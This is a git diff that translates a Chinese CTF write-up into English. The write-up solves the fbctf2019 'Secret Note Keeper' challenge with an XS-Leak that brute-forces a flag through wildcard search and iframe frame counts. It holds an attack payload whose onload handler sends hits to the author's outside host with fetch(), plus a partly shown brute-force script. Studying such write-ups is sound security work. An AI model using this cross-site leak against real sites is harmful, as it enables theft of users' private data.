@@ -1,34 +1,30 @@
 # Secret Note Keeper
 
-Solved: 61
 
-### [English Version](https://github.com/w181496/CTF/blob/master/fbctf2019/secret_note_keeper/README_en.md)
-
-<br>
-
-## 題目分析
-
-- 這題乍看之下功能跟 35C3 filemanager 沒啥兩樣
-    - login/logout/register
-    - Add Note
+## Problem Analysis
+- This challenge looks same as 35C3 CTF filemanager:
+    - Register / Login / Logout
+    - Add note
     - Search Note
-    - Report Bug
-- 回報自己的 domain 看一下 BOT 的 User-Agent:
+    - Report bug
+    
+- Let's try to report my domain and view the request:
     - `HeadlessChrome/74.0.3729.169 Safari/537.36`
-    - Chrome 74，看起來沒辦法用 XSS Auditor 去判斷
-- 踹了一下，發現有兩種特殊字元
-    - `_`能匹配任意一個字元
-    - `%`能匹配任意多個字元
-- 另外在 Search Note ，如果有找到時，會用 iframe 把該 note 抓進來
+    - [Chrome 74](https://portswigger.net/daily-swig/google-chromes-xss-auditor-goes-back-to-filter-mode), it seems like we can't use XSS Auditor to leak data. Because it goes back to filter mode from block mode.
+- After fuzzing, we found two special characters:
+    - `_` will match any single character
+    - `%` will match many characters
+    - we can use this feature to get the length of the flag
+- In `Search note`, if it found any note, it will use `iframe` to import the corresponding note to the page.
 
 ## Exploit
 
-- 這題很明顯想考 XS-Leak
-- 到這邊大概就能想到可以利用 frame count (`contentWindow.length`) 去判斷是否有找到 Note
-    - 有找到 => frame count >= 1
-    - 沒找到 => frame count = 0
+- Obviously, this is a XS-Leak challenge
+- We can use frame count (`contentWindow.length`) to identify whether it found the notes or not
+    - found => `frame count >= 1`
+    - not found => `frame count = 0`
 
-- 寫個腳本暴力搜一下就行:
+- Write a script to bruteforce it:
 
 ```python
 import requests
@@ -64,12 +60,13 @@ for i in alphabet:
     print r2.text
 ```
 
-其中 log.php:
+And the `log.php` in above script is:
 
 ```php
 <iframe src="http://challenges.fbctf.com:8082/search?query=fb{cr055_s173_l34<?php echo $_GET[1];?>%}" onload="if(this.contentWindow.length>=1){fetch('http://kaibro.tw/?fb=ok');}">
 ```
 
-如果收到 `ok` 就代表找到該字元，就能繼續爆下一個字元
+If we found the character, then we will receive the `ok` request message. Then we can try the next character. 
 
 flag: `fb{cr055_s173_l34|<5_4r4_c00ool!!}`
+
